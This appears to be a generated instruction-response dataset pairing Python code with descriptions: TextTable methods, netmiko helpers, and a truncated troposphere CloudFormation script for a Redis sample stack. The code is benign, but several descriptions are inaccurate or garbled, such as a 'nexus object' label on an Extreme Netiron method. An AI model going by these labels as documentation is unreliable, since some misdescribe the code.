{"SOURCE": "codesearchnet", "instruction": "Write a Python 3 function for\napplying the function to every row in the table.", "response": "def Map(self, function):\n        \"\"\"Applies the function to every row in the table.\n\n    Args:\n      function: A function applied to each row.\n\n    Returns:\n      A new TextTable()\n\n    Raises:\n      TableError: When transform is not invalid row entry. The transform\n                  must be compatible with Append().\n    \"\"\"\n        new_table = self.__class__()\n        # pylint: disable=protected-access\n        new_table._table = [self.header]\n        for row in self:\n            filtered_row = function(row)\n            if filtered_row:\n                new_table.Append(filtered_row)\n        return new_table"}
{"SOURCE": "codesearchnet", "instruction": "Can you generate the documentation for the following Python 3 function\ndef sort(self, cmp=None, key=None, reverse=False):\n\n        def _DefaultKey(value):\n            \"\"\"Default key func is to create a list of all fields.\"\"\"\n            result = []\n            for key in self.header:\n                # Try sorting as numerical value if possible.\n                try:\n                    result.append(float(value[key]))\n                except ValueError:\n                    result.append(value[key])\n            return result\n\n        key = key or _DefaultKey\n        # Exclude header by copying table.\n        new_table = self._table[1:]\n\n        if cmp is not None:\n            key = cmp_to_key(cmp)\n\n        new_table.sort(key=key, reverse=reverse)\n\n        # Regenerate the table with original header\n        self._table = [self.header]\n        self._table.extend(new_table)\n        # Re-write the 'row' attribute of each row\n        for index, row in enumerate(self._table):\n            row.row = index", "response": "Sorts the rows in the texttable."}
{"SOURCE": "codesearchnet", "instruction": "Can you generate a brief explanation for the following Python 3 code\ndef extend(self, table, keys=None):\n        if keys:\n            for k in keys:\n                if k not in self._Header():\n                    raise IndexError(\"Unknown key: '%s'\", k)\n\n        extend_with = []\n        for column in table.header:\n            if column not in self.header:\n                extend_with.append(column)\n\n        if not extend_with:\n            return\n\n        for column in extend_with:\n            self.AddColumn(column)\n\n        if not keys:\n            for row1, row2 in zip(self, table):\n                for column in extend_with:\n                    row1[column] = row2[column]\n            return\n\n        for row1 in self:\n            for row2 in table:\n                for k in keys:\n                    if row1[k] != row2[k]:\n                        break\n                else:\n                    for column in extend_with:\n                        row1[column] = row2[column]\n                    break", "response": "Extends all rows in the texttable by the new columns from the table."}
{"SOURCE": "codesearchnet", "instruction": "Create a Python 3 function for\nremoving a row from the table.", "response": "def Remove(self, row):\n        \"\"\"Removes a row from the table.\n\n    Args:\n      row: int, the row number to delete. Must be >= 1, as the header\n        cannot be removed.\n\n    Raises:\n      TableError: Attempt to remove nonexistent or header row.\n    \"\"\"\n        if row == 0 or row > self.size:\n            raise TableError(\"Attempt to remove header row\")\n        new_table = []\n        # pylint: disable=E1103\n        for t_row in self._table:\n            if t_row.row != row:\n                new_table.append(t_row)\n                if t_row.row > row:\n                    t_row.row -= 1\n        self._table = new_table"}
{"SOURCE": "codesearchnet", "instruction": "Write a Python 3 script to\nreturn the current row as a tuple.", "response": "def _GetRow(self, columns=None):\n        \"\"\"Returns the current row as a tuple.\"\"\"\n\n        row = self._table[self._row_index]\n        if columns:\n            result = []\n            for col in columns:\n                if col not in self.header:\n                    raise TableError(\"Column header %s not known in table.\" % col)\n                result.append(row[self.header.index(col)])\n            row = result\n        return row"}
{"SOURCE": "codesearchnet", "instruction": "Can you generate the documentation for the following Python 3 function\ndef _SetRow(self, new_values, row=0):\n\n        if not row:\n            row = self._row_index\n\n        if row > self.size:\n            raise TableError(\"Entry %s beyond table size %s.\" % (row, self.size))\n\n        self._table[row].values = new_values", "response": "Sets the current row to new list."}
{"SOURCE": "codesearchnet", "instruction": "How would you implement a function in Python 3 that\nsets the header of the table to the given tuple.", "response": "def _SetHeader(self, new_values):\n        \"\"\"Sets header of table to the given tuple.\n\n    Args:\n      new_values: Tuple of new header values.\n    \"\"\"\n        row = self.row_class()\n        row.row = 0\n        for v in new_values:\n            row[v] = v\n        self._table[0] = row"}
{"SOURCE": "codesearchnet", "instruction": "How would you implement a function in Python 3 that\nfinds the largest indivisible word of a string and thus the smallest possible column width that can contain that single word.", "response": "def _SmallestColSize(self, text):\n        \"\"\"Finds the largest indivisible word of a string.\n\n    ...and thus the smallest possible column width that can contain that\n    word unsplit over rows.\n\n    Args:\n      text: A string of text potentially consisting of words.\n\n    Returns:\n      Integer size of the largest single word in the text.\n    \"\"\"\n        if not text:\n            return 0\n        stripped = terminal.StripAnsiText(text)\n        return max(len(word) for word in stripped.split())"}
{"SOURCE": "codesearchnet", "instruction": "Can you generate the documentation for the following Python 3 function\ndef RowWith(self, column, value):\n        for row in self._table[1:]:\n            if row[column] == value:\n                return row\n        return None", "response": "Retrieves the first non header row with the given column of the given value."}
{"SOURCE": "codesearchnet", "instruction": "How would you explain what the following Python 3 function does\ndef AddColumn(self, column, default=\"\", col_index=-1):\n        if column in self.table:\n            raise TableError(\"Column %r already in table.\" % column)\n        if col_index == -1:\n            self._table[0][column] = column\n            for i in range(1, len(self._table)):\n                self._table[i][column] = default\n        else:\n            self._table[0].Insert(column, column, col_index)\n            for i in range(1, len(self._table)):\n                self._table[i].Insert(column, default, col_index)", "response": "Appends a new column to the table."}
{"SOURCE": "codesearchnet", "instruction": "Can you generate a brief explanation for the following Python 3 code\ndef Append(self, new_values):\n        newrow = self.NewRow()\n        newrow.values = new_values\n        self._table.append(newrow)", "response": "Adds a new row to the table."}
{"SOURCE": "codesearchnet", "instruction": "Write a Python 3 function for\nfetching a new empty row with headers populated.", "response": "def NewRow(self, value=\"\"):\n        \"\"\"Fetches a new, empty row, with headers populated.\n\n    Args:\n      value: Initial value to set each row entry to.\n\n    Returns:\n      A Row() object.\n    \"\"\"\n        newrow = self.row_class()\n        newrow.row = self.size + 1\n        newrow.table = self\n        headers = self._Header()\n        for header in headers:\n            newrow[header] = value\n        return newrow"}
{"SOURCE": "codesearchnet", "instruction": "Write a Python 3 function for\nparsing a CSV file into a table.", "response": "def CsvToTable(self, buf, header=True, separator=\",\"):\n        \"\"\"Parses buffer into tabular format.\n\n    Strips off comments (preceded by '#').\n    Optionally parses and indexes by first line (header).\n\n    Args:\n      buf: String file buffer containing CSV data.\n      header: Is the first line of buffer a header.\n      separator: String that CSV is separated by.\n\n    Returns:\n      int, the size of the table created.\n\n    Raises:\n      TableError: A parsing error occurred.\n    \"\"\"\n        self.Reset()\n\n        header_row = self.row_class()\n        if header:\n            line = buf.readline()\n            header_str = \"\"\n            while not header_str:\n                # Remove comments.\n                header_str = line.split(\"#\")[0].strip()\n                if not header_str:\n                    line = buf.readline()\n\n            header_list = header_str.split(separator)\n            header_length = len(header_list)\n\n            for entry in header_list:\n                entry = entry.strip()\n                if entry in header_row:\n                    raise TableError(\"Duplicate header entry %r.\" % entry)\n\n                header_row[entry] = entry\n            header_row.row = 0\n            self._table[0] = header_row\n\n        # xreadlines would be better but not supported by StringIO for testing.\n        for line in buf:\n            # Support commented lines, provide '#' is first character of line.\n            if line.startswith(\"#\"):\n                continue\n\n            lst = line.split(separator)\n            lst = [l.strip() for l in lst]\n            if header and len(lst) != header_length:\n                # Silently drop illegal line entries\n                continue\n            if not header:\n                header_row = self.row_class()\n                header_length = len(lst)\n                header_row.values = dict(\n                    zip(range(header_length), range(header_length))\n                )\n                self._table[0] = header_row\n                header = True\n                continue\n\n            new_row = self.NewRow()\n            new_row.values = lst\n            header_row.row = self.size + 1\n            self._table.append(new_row)\n\n        return self.size"}
{"SOURCE": "codesearchnet", "instruction": "Given the following Python 3 function, write the documentation\ndef save_config(self, cmd=\"save config\", confirm=False, confirm_response=\"\"):\n        return super(ExtremeVspSSH, self).save_config(\n            cmd=cmd, confirm=confirm, confirm_response=confirm_response\n        )", "response": "Save config of the current user."}
{"SOURCE": "codesearchnet", "instruction": "Can you create a Python 3 function that\nmakes sure paging is disabled.", "response": "def disable_paging(self, command=\"pager off\", delay_factor=1):\n        \"\"\"Make sure paging is disabled.\"\"\"\n        return super(PluribusSSH, self).disable_paging(\n            command=command, delay_factor=delay_factor\n        )"}
{"SOURCE": "codesearchnet", "instruction": "Here you have a function in Python 3, explain what it does\ndef find_cfg_file(file_name=None):\n    base_file = \".netmiko.yml\"\n    check_files = [base_file, os.path.expanduser(\"~\") + \"/\" + base_file]\n    if file_name:\n        check_files.insert(0, file_name)\n    for test_file in check_files:\n        if os.path.isfile(test_file):\n            return test_file\n    raise IOError(\"{}: file not found in current dir or home dir.\".format(base_file))", "response": "Look for. netmiko. yml in current dir then ~. netmiko. yml."}
{"SOURCE": "codesearchnet", "instruction": "Create a Python 3 function to\nprint out inventory devices and groups.", "response": "def display_inventory(my_devices):\n    \"\"\"Print out inventory devices and groups.\"\"\"\n    inventory_groups = [\"all\"]\n    inventory_devices = []\n    for k, v in my_devices.items():\n        if isinstance(v, list):\n            inventory_groups.append(k)\n        elif isinstance(v, dict):\n            inventory_devices.append((k, v[\"device_type\"]))\n\n    inventory_groups.sort()\n    inventory_devices.sort(key=lambda x: x[0])\n    print(\"\\nDevices:\")\n    print(\"-\" * 40)\n    for a_device, device_type in inventory_devices:\n        device_type = \"  ({})\".format(device_type)\n        print(\"{:<25}{:>15}\".format(a_device, device_type))\n    print(\"\\n\\nGroups:\")\n    print(\"-\" * 40)\n    for a_group in inventory_groups:\n        print(a_group)\n    print()"}
{"SOURCE": "codesearchnet", "instruction": "Make a summary of the following Python 3 code\ndef obtain_all_devices(my_devices):\n    new_devices = {}\n    for device_name, device_or_group in my_devices.items():\n        # Skip any groups\n        if not isinstance(device_or_group, list):\n            new_devices[device_name] = device_or_group\n    return new_devices", "response": "Dynamically create all group."}
{"SOURCE": "codesearchnet", "instruction": "Make a summary of the following Python 3 code\ndef ensure_dir_exists(verify_dir):\n    if not os.path.exists(verify_dir):\n        # Doesn't exist create dir\n        os.makedirs(verify_dir)\n    else:\n        # Exists\n        if not os.path.isdir(verify_dir):\n            # Not a dir, raise an exception\n            raise ValueError(\"{} is not a directory\".format(verify_dir))", "response": "Ensure directory exists. Create if necessary."}
{"SOURCE": "codesearchnet", "instruction": "How would you explain what the following Python 3 function does\ndef find_netmiko_dir():\n    try:\n        netmiko_base_dir = os.environ[\"NETMIKO_DIR\"]\n    except KeyError:\n        netmiko_base_dir = NETMIKO_BASE_DIR\n    netmiko_base_dir = os.path.expanduser(netmiko_base_dir)\n    if netmiko_base_dir == \"/\":\n        raise ValueError(\"/ cannot be netmiko_base_dir\")\n    netmiko_full_dir = \"{}/tmp\".format(netmiko_base_dir)\n    return (netmiko_base_dir, netmiko_full_dir)", "response": "Find the netmiko dir and full dir"}
{"SOURCE": "codesearchnet", "instruction": "Can you generate a brief explanation for the following Python 3 code\ndef write_bytes(out_data, encoding=\"ascii\"):\n    if sys.version_info[0] >= 3:\n        if isinstance(out_data, type(\"\")):\n            if encoding == \"utf-8\":\n                return out_data.encode(\"utf-8\")\n            else:\n                return out_data.encode(\"ascii\", \"ignore\")\n        elif isinstance(out_data, type(b\"\")):\n            return out_data\n    else:\n        if isinstance(out_data, type(\"\")):\n            if encoding == \"utf-8\":\n                return out_data.encode(\"utf-8\")\n            else:\n                return out_data.encode(\"ascii\", \"ignore\")\n        elif isinstance(out_data, type(str(\"\"))):\n            return out_data\n    msg = \"Invalid value for out_data neither unicode nor byte string: {}\".format(\n        out_data\n    )\n    raise ValueError(msg)", "response": "Write Python2 and Python3 compatible byte stream."}
{"SOURCE": "codesearchnet", "instruction": "Can you generate a brief explanation for the following Python 3 code\ndef check_serial_port(name):\n    try:\n        cdc = next(serial.tools.list_ports.grep(name))\n        return cdc[0]\n    except StopIteration:\n        msg = \"device {} not found. \".format(name)\n        msg += \"available devices are: \"\n        ports = list(serial.tools.list_ports.comports())\n        for p in ports:\n            msg += \"{},\".format(text_type(p))\n        raise ValueError(msg)", "response": "returns valid COM Port."}
{"SOURCE": "codesearchnet", "instruction": "Explain what the following Python 3 code does\ndef get_template_dir():\n    try:\n        template_dir = os.path.expanduser(os.environ[\"NET_TEXTFSM\"])\n        index = os.path.join(template_dir, \"index\")\n        if not os.path.isfile(index):\n            # Assume only base ./ntc-templates specified\n            template_dir = os.path.join(template_dir, \"templates\")\n    except KeyError:\n        # Construct path ~/ntc-templates/templates\n        home_dir = os.path.expanduser(\"~\")\n        template_dir = os.path.join(home_dir, \"ntc-templates\", \"templates\")\n\n    index = os.path.join(template_dir, \"index\")\n    if not os.path.isdir(template_dir) or not os.path.isfile(index):\n        msg = \"\"\"\nValid ntc-templates not found, please install https://github.com/networktocode/ntc-templates\nand then set the NET_TEXTFSM environment variable to point to the ./ntc-templates/templates\ndirectory.\"\"\"\n        raise ValueError(msg)\n    return os.path.abspath(template_dir)", "response": "Find and return the ntc - templates dir."}
{"SOURCE": "codesearchnet", "instruction": "Can you implement a function in Python 3 that\nconverts TextFSM cli_table object to list of dictionaries.", "response": "def clitable_to_dict(cli_table):\n    \"\"\"Converts TextFSM cli_table object to list of dictionaries.\"\"\"\n    objs = []\n    for row in cli_table:\n        temp_dict = {}\n        for index, element in enumerate(row):\n            temp_dict[cli_table.header[index].lower()] = element\n        objs.append(temp_dict)\n    return objs"}
{"SOURCE": "codesearchnet", "instruction": "Here you have a function in Python 3, explain what it does\ndef get_structured_data(raw_output, platform, command):\n    template_dir = get_template_dir()\n    index_file = os.path.join(template_dir, \"index\")\n    textfsm_obj = clitable.CliTable(index_file, template_dir)\n    attrs = {\"Command\": command, \"Platform\": platform}\n    try:\n        # Parse output through template\n        textfsm_obj.ParseCmd(raw_output, attrs)\n        structured_data = clitable_to_dict(textfsm_obj)\n        output = raw_output if structured_data == [] else structured_data\n        return output\n    except CliTableError:\n        return raw_output", "response": "Convert raw CLI output to structured data using TextFSM template."}
{"SOURCE": "codesearchnet", "instruction": "Create a Python 3 function to\nsave config from a nexus object.", "response": "def save_config(self, cmd=\"write memory\", confirm=False, confirm_response=\"\"):\n        \"\"\"Save Config\"\"\"\n        return super(ExtremeNetironBase, self).save_config(\n            cmd=cmd, confirm=confirm, confirm_response=confirm_response\n        )"}
{"SOURCE": "codesearchnet", "instruction": "Write a Python 3 function for\ncreating a ElastiCache Redis Node and EC2 Instance", "response": "def main():\n    \"\"\"\n    Create a ElastiCache Redis Node and EC2 Instance\n    \"\"\"\n\n    template = Template()\n\n    # Description\n    template.add_description(\n        'AWS CloudFormation Sample Template ElastiCache_Redis:'\n        'Sample template showing how to create an Amazon'\n        'ElastiCache Redis Cluster. **WARNING** This template'\n        'creates an Amazon EC2 Instance and an Amazon ElastiCache'\n        'Cluster. You will be billed for the AWS resources used'\n        'if you create a stack from this template.')\n\n    # Mappings\n    template.add_mapping('AWSInstanceType2Arch', {\n        't1.micro':     {'Arch': 'PV64'},\n        't2.micro':     {'Arch': 'HVM64'},\n        't2.small':     {'Arch': 'HVM64'},\n        't2.medium':    {'Arch': 'HVM64'},\n        'm1.small':     {'Arch': 'PV64'},\n        'm1.medium':    {'Arch': 'PV64'},\n        'm1.large':     {'Arch': 'PV64'},\n        'm1.xlarge':    {'Arch': 'PV64'},\n        'm2.xlarge':    {'Arch': 'PV64'},\n        'm2.2xlarge':   {'Arch': 'PV64'},\n        'm2.4xlarge':   {'Arch': 'PV64'},\n        'm3.medium':    {'Arch': 'HVM64'},\n        'm3.large':     {'Arch': 'HVM64'},\n        'm3.xlarge':    {'Arch': 'HVM64'},\n        'm3.2xlarge':   {'Arch': 'HVM64'},\n        'c1.medium':    {'Arch': 'PV64'},\n        'c1.xlarge':    {'Arch': 'PV64'},\n        'c3.large':     {'Arch': 'HVM64'},\n        'c3.xlarge':    {'Arch': 'HVM64'},\n        'c3.2xlarge':   {'Arch': 'HVM64'},\n        'c3.4xlarge':   {'Arch': 'HVM64'},\n        'c3.8xlarge':   {'Arch': 'HVM64'},\n        'c4.large':     {'Arch': 'HVM64'},\n        'c4.xlarge':    {'Arch': 'HVM64'},\n        'c4.2xlarge':   {'Arch': 'HVM64'},\n        'c4.4xlarge':   {'Arch': 'HVM64'},\n        'c4.8xlarge':   {'Arch': 'HVM64'},\n        'g2.2xlarge':   {'Arch': 'HVMG2'},\n        'r3.large':     {'Arch': 'HVM64'},\n        'r3.xlarge':    {'Arch': 'HVM64'},\n        'r3.2xlarge':   {'Arch': 'HVM64'},\n        'r3.4xlarge':   {'Arch': 'HVM64'},\n        'r3.8xlarge':   {'Arch': 'HVM64'},\n        'i2.xlarge':    {'Arch': 'HVM64'},\n        'i2.2xlarge':   {'Arch': 'HVM64'},\n        'i2.4xlarge':   {'Arch': 'HVM64'},\n        'i2.8xlarge':   {'Arch': 'HVM64'},\n        'd2.xlarge':    {'Arch': 'HVM64'},\n        'd2.2xlarge':   {'Arch': 'HVM64'},\n        'd2.4xlarge':   {'Arch': 'HVM64'},\n        'd2.8xlarge':   {'Arch': 'HVM64'},\n        'hi1.4xlarge':  {'Arch': 'HVM64'},\n        'hs1.8xlarge':  {'Arch': 'HVM64'},\n        'cr1.8xlarge':  {'Arch': 'HVM64'},\n        'cc2.8xlarge':  {'Arch': 'HVM64'}\n        })\n\n    template.add_mapping('AWSRegionArch2AMI', {\n        'us-east-1': {'PV64': 'ami-0f4cfd64',\n                      'HVM64': 'ami-0d4cfd66',\n                      'HVMG2': 'ami-5b05ba30'},\n        'us-west-2': {'PV64': 'ami-d3c5d1e3',\n                      'HVM64': 'ami-d5c5d1e5',\n                      'HVMG2': 'ami-a9d6c099'},\n        'us-west-1': {'PV64': 'ami-85ea13c1',\n                      'HVM64': 'ami-87ea13c3',\n                      'HVMG2': 'ami-37827a73'},\n        'eu-west-1': {'PV64': 'ami-d6d18ea1',\n                      'HVM64': 'ami-e4d18e93',\n                      'HVMG2': 'ami-72a9f105'},\n        'eu-central-1': {'PV64': 'ami-a4b0b7b9',\n                         'HVM64': 'ami-a6b0b7bb',\n                         'HVMG2': 'ami-a6c9cfbb'},\n        'ap-northeast-1': {'PV64': 'ami-1a1b9f1a',\n                           'HVM64': 'ami-1c1b9f1c',\n                           'HVMG2': 'ami-f644c4f6'},\n        'ap-southeast-1': {'PV64': 'ami-d24b4280',\n                           'HVM64': 'ami-d44b4286',\n                           'HVMG2': 'ami-12b5bc40'},\n        'ap-southeast-2': {'PV64': 'ami-ef7b39d5',\n                           'HVM64': 'ami-db7b39e1',\n                           'HVMG2': 'ami-b3337e89'},\n        'sa-east-1': {'PV64': 'ami-5b098146',\n                      'HVM64': 'ami-55098148',\n                      'HVMG2': 'NOT_SUPPORTED'},\n        'cn-north-1': {'PV64': 'ami-bec45887',\n                       'HVM64': 'ami-bcc45885',\n                       'HVMG2': 'NOT_SUPPORTED'}\n        })\n\n    template.add_mapping('Region2Principal', {\n        'us-east-1': {'EC2Principal': 'ec2.amazonaws.com',\n                      'OpsWorksPrincipal': 'opsworks.amazonaws.com'},\n        'us-west-2': {'EC2Principal': 'ec2.amazonaws.com',\n                      'OpsWorksPrincipal': 'opsworks.amazonaws.com'},\n        'us-west-1': {'EC2Principal': 'ec2.amazonaws.com',\n                      'OpsWorksPrincipal': 'opsworks.amazonaws.com'},\n        'eu-west-1': {'EC2Principal': 'ec2.amazonaws.com',\n                      'OpsWorksPrincipal': 'opsworks.amazonaws.com'},\n        'ap-southeast-1': {'EC2Principal': 'ec2.amazonaws.com',\n                           'OpsWorksPrincipal': 'opsworks.amazonaws.com'},\n        'ap-northeast-1': {'EC2Principal': 'ec2.amazonaws.com',\n                           'OpsWorksPrincipal': 'opsworks.amazonaws.com'},\n        'ap-southeast-2': {'EC2Principal': 'ec2.amazonaws.com',\n                           'OpsWorksPrincipal': 'opsworks.amazonaws.com'},\n        'sa-east-1': {'EC2Principal': 'ec2.amazonaws.com',\n                      'OpsWorksPrincipal': 'opsworks.amazonaws.com'},\n        'cn-north-1': {'EC2Principal': 'ec2.amazonaws.com.cn',\n                       'OpsWorksPrincipal': 'opsworks.amazonaws.com.cn'},\n        'eu-central-1': {'EC2Principal': 'ec2.amazonaws.com',\n                         'OpsWorksPrincipal': 'opsworks.amazonaws.com'}\n        })\n\n    # Parameters\n    cachenodetype = template.add_parameter(Parameter(\n        'ClusterNodeType',\n        Description='The compute and memory capacity of the nodes in the Redis'\n                    ' Cluster',\n        Type='String',\n        Default='cache.m1.small',\n        AllowedValues=['cache.m1.small',\n                       'cache.m1.large',\n                       'cache.m1.xlarge',\n                       'cache.m2.xlarge',\n                       'cache.m2.2xlarge',\n                       'cache.m2.4xlarge',\n                       'cache.c1.xlarge'],\n        ConstraintDescription='must select a valid Cache Node type.',\n        ))\n\n    instancetype = template.add_parameter(Parameter(\n        'InstanceType',\n        Description='WebServer EC2 instance type',\n        Type='String',\n        Default='t2.micro',\n        AllowedValues=['t1.micro',\n                       't2.micro',\n                       't2.small',\n                       't2.medium',\n                       'm1.small',\n                       'm1.medium',\n                       'm1.large',\n                       'm1.xlarge',\n                       'm2.xlarge',\n                       'm2.2xlarge',\n                       'm2.4xlarge',\n                       'm3.medium',\n                       'm3.large',\n                       'm3.xlarge',\n                       'm3.2xlarge',\n                       'c1.medium',\n                       'c1.xlarge',\n                       'c3.large',\n                       'c3.xlarge',\n                       'c3.2xlarge',\n                       'c3.4xlarge',\n                       'c3.8xlarge',\n                       'c4.large',\n                       'c4.xlarge',\n                       'c4.2xlarge',\n                       'c4.4xlarge',\n                       'c4.8xlarge',\n                       'g2.2xlarge',\n                       'r3.large',\n                       'r3.xlarge',\n                       'r3.2xlarge',\n                       'r3.4xlarge',\n                       'r3.8xlarge',\n                       'i2.xlarge',\n                       'i2.2xlarge',\n                       'i2.4xlarge',\n                       'i2.8xlarge',\n                       'd2.xlarge',\n                       'd2.2xlarge',\n                       'd2.4xlarge',\n                       'd2.8xlarge',\n                       'hi1.4xlarge',\n                       'hs1.8xlarge',\n                       'cr1.8xlarge',\n                       'cc2.8xlarge',\n                       'cg1.4xlarge'],\n        ConstraintDescription='must be a valid EC2 instance type.',\n        ))\n\n    keyname = template.add_parameter(Parameter(\n        'KeyName',\n        Description='Name of an existing EC2 KeyPair to enable SSH access'\n                    ' to the instance',\n        Type='AWS::EC2::KeyPair::KeyName',\n        ConstraintDescription='must be the name of an existing EC2 KeyPair.',\n        ))\n\n    sshlocation = template.add_parameter(Parameter(\n        'SSHLocation',\n        Description='The IP address range that can be used to SSH to'\n                    ' the EC2 instances',\n        Type='String',\n        MinLength='9',\n        MaxLength='18',\n        Default='0.0.0.0/0',\n        AllowedPattern='(\\\\d{1,3})\\\\.(\\\\d{1,3})\\\\.'\n                       '(\\\\d{1,3})\\\\.(\\\\d{1,3})/(\\\\d{1,2})',\n        ConstraintDescription='must be a valid IP CIDR range of the'\n                              ' form x.x.x.x/x.'\n        ))\n\n    # Resources\n    webserverrole = template.add_resource(iam.Role(\n        'WebServerRole',\n        AssumeRolePolicyDocument=Policy(\n            Statement=[\n                Statement(\n                    Effect=Allow,\n                    Action=[AssumeRole],\n                    Principal=Principal('Service',\n                                        [FindInMap('Region2Principal',\n                                                   Ref('AWS::Region'),\n                                                   'EC2Principal')]),\n                    )\n                ]\n            ),\n        Path='/',\n    ))\n\n    template.add_resource(iam.PolicyType(\n        'WebServerRolePolicy',\n        PolicyName='WebServerRole',\n        PolicyDocument=awacs.aws.Policy(\n            Statement=[awacs.aws.Statement(\n                Action=[awacs.aws.Action(\"elasticache\",\n                        \"DescribeCacheClusters\")],\n                Resource=[\"*\"],\n                Effect=awacs.aws.Allow\n            )]\n        ),\n        Roles=[Ref(webserverrole)],\n    ))\n\n    webserverinstanceprofile = template.add_resource(iam.InstanceProfile(\n        'WebServerInstanceProfile',\n        Path='/',\n        Roles=[Ref(webserverrole)],\n    ))\n\n    webserversg = template.add_resource(ec2.SecurityGroup(\n        'WebServerSecurityGroup',\n        GroupDescription='Enable HTTP and SSH access',\n        SecurityGroupIngress=[\n            ec2.SecurityGroupRule(\n                IpProtocol='tcp',\n                FromPort='22',\n                ToPort='22',\n                CidrIp=Ref(sshlocation),\n                ),\n            ec2.SecurityGroupRule(\n                IpProtocol='tcp',\n                FromPort='80',\n                ToPort='80',\n                CidrIp='0.0.0.0/0',\n                )\n            ]\n        ))\n\n    webserverinstance = template.add_resource(ec2.Instance(\n        'WebServerInstance',\n        Metadata=cloudformation.Metadata(\n            cloudformation.Init({\n                'config': cloudformation.InitConfig(\n                    packages={\n                        'yum': {\n                            'httpd':     [],\n                            'php':       [],\n                            'php-devel': [],\n                            'gcc':       [],\n                            'make':      []\n                            }\n                        },\n\n                    files=cloudformation.InitFiles({\n                        '/var/www/html/index.php': cloudformation.InitFile(\n                            content=Join('', [\n                                '<?php\\n',\n                                'echo \\\"<h1>AWS CloudFormation sample'\n                                ' application for Amazon ElastiCache'\n                                ' Redis Cluster</h1>\\\";\\n',\n                                '\\n',\n                                '$cluster_config = json_decode('\n                                'file_get_contents(\\'/tmp/cacheclusterconfig\\''\n                                '), true);\\n',\n                                '$endpoint = $cluster_config[\\'CacheClusters'\n                                '\\'][0][\\'CacheNodes\\'][0][\\'Endpoint\\'][\\'Add'\n                                'ress\\'];\\n',\n                                '$port = $cluster_config[\\'CacheClusters\\'][0]'\n                                '[\\'CacheNodes\\'][0][\\'Endpoint\\'][\\'Port\\'];'\n                                '\\n',\n                                '\\n',\n                                'echo \\\"<p>Connecting to Redis Cache Cluster '\n                                'node \\'{$endpoint}\\' on port {$port}</p>\\\";'\n                                '\\n',\n                                '\\n',\n                                '$redis=new Redis();\\n',\n                                '$redis->connect($endpoint, $port);\\n',\n                                '$redis->set(\\'testkey\\', \\'Hello World!\\');'\n                                '\\n',\n                                '$return = $redis->get(\\'testkey\\');\\n',\n                                '\\n',\n                                'echo \\\"<p>Retrieved value: $return</p>\\\";'\n                                '\\n',\n                                '?>\\n'\n                                ]),\n                            mode='000644',\n                            owner='apache',\n                            group='apache'\n                            ),\n                        '/etc/cron.d/get_cluster_config':\n                            cloudformation.InitFile(\n                                content='*/5 * * * * root'\n                                        ' /usr/local/bin/get_cluster_config',\n                                mode='000644',\n                                owner='root',\n                                group='root'\n                                ),\n                        '/usr/local/bin/get_cluster_config':\n                            cloudformation.InitFile(\n                                content=Join('', [\n                                    '#! /bin/bash\\n',\n                                    'aws elasticache describe-cache-clusters ',\n                                    '         --cache-cluster-id ',\n                                    Ref('RedisCluster'),\n                                    '         --show-cache-node-info'\n                                    ' --region ', Ref('AWS::Region'),\n                                    ' > /tmp/cacheclusterconfig\\n'\n                                    ]),\n                                mode='000755',\n                                owner='root',\n                                group='root'\n                                ),\n                        '/usr/local/bin/install_phpredis':\n                            cloudformation.InitFile(\n                                content=Join('', [\n                                    '#! /bin/bash\\n',\n                                    'cd /tmp\\n',\n                                    'wget https://github.com/nicolasff/'\n                                    'phpredis/zipball/master -O phpredis.zip'\n                                    '\\n',\n                                    'unzip phpredis.zip\\n',\n                                    'cd nicolasff-phpredis-*\\n',\n                                    'phpize\\n',\n                                    './configure\\n',\n                                    'make && make install\\n',\n                                    'touch /etc/php.d/redis.ini\\n',\n                                    'echo extension=redis.so > /etc/php.d/'\n                                    'redis.ini\\n'\n                                    ]),\n                                mode='000755',\n                                owner='root',\n                                group='root'\n                                ),\n                        '/etc/cfn/cfn-hup.conf': cloudformation.InitFile(\n                            content=Join('', [\n                                '[main]\\n',\n                                'stack=', Ref('AWS::StackId'), '\\n',\n                                'region=', Ref('AWS::Region'), '\\n'\n                                ]),\n                            mode='000400',\n                            owner='root',\n                            group='root'\n                            ),\n                        '/etc/cfn/hooks.d/cfn-auto-reloader.conf':\n                            cloudformation.InitFile(\n                                content=Join('', [\n                                    '[cfn-auto-reloader-hook]\\n',\n                                    'triggers=post.update\\n',\n                                    'path=Resources.WebServerInstance.Metadata'\n                                    '.AWS::CloudFormation::Init\\n',\n                                    'action=/opt/aws/bin/cfn-init -v ',\n                                    '         --stack ', Ref('AWS::StackName'),\n                                    '         --resource WebServerInstance ',\n                                    '         --region ', Ref('AWS::Region'),\n                                    '\\n',\n                                    'runas=root\\n'\n                                    ]),\n                                # Why doesn't the Amazon template have this?\n                                # mode='000400',\n                                # owner='root',\n                                # group='root'\n                                ),\n                        }),\n\n                    commands={\n                        '01-install_phpredis': {\n                            'command': '/usr/local/bin/install_phpredis'\n                            },\n                        '02-get-cluster-config': {\n                            'command': '/usr/local/bin/get_cluster_config'\n                            }\n                        },\n\n                    services={\n                        \"sysvinit\": cloudformation.InitServices({\n                            \"httpd\": cloudformation.InitService(\n                                enabled=True,\n                                ensureRunning=True,\n                                ),\n                            \"cfn-hup\": cloudformation.InitService(\n                                enabled=True,\n                                ensureRunning=True,\n                                files=['/etc/cfn/cfn-hup.conf',\n                                       '/etc/cfn/hooks.d/'\n                                       'cfn-auto-reloader.conf']\n                                ),\n                            }),\n                        },\n                    )\n                })\n            ),\n        ImageId=FindInMap('AWSRegionArch2AMI', Ref('AWS::Region'),\n                          FindInMap('AWSInstanceType2Arch',\n                                    Ref(instancetype), 'Arch')),\n        InstanceType=Ref(instancetype),\n        SecurityGroups=[Ref(webserversg)],\n        KeyName=Ref(keyname),\n        IamInstanceProfile=Ref(webserverinstanceprofile),\n        UserData=Base64(Join('', [\n            '#!/bin/bash -xe\\n',\n            'yum update -y aws-cfn-bootstrap\\n',\n\n            '# Setup the PHP sample application\\n',\n            '/opt/aws/bin/cfn-init -v ',\n            '         --stack ', Ref('AWS::StackName'),\n            '         --resource WebServerInstance ',\n            '         --region ', Ref('AWS::Region'), '\\n',\n\n            '# Signal the status of cfn-init\\n',\n            '/opt/aws/bin/cfn-signal -e $? ',\n            '         --stack ', Ref('AWS::StackName'),\n            '         --resource WebServerInstance ',\n            '         --region ', Ref('AWS::Region'), '\\n'\n            ])),\n        CreationPolicy=CreationPolicy(\n            ResourceSignal=ResourceSignal(Timeout='PT15M')\n            ),\n        Tags=Tags(Application=Ref('AWS::StackId'),\n                  Details='Created using Troposhpere')\n        ))\n\n    redisclustersg = template.add_resource(elasticache.SecurityGroup(\n        'RedisClusterSecurityGroup',\n        Description='Lock the cluster down',\n        ))\n\n    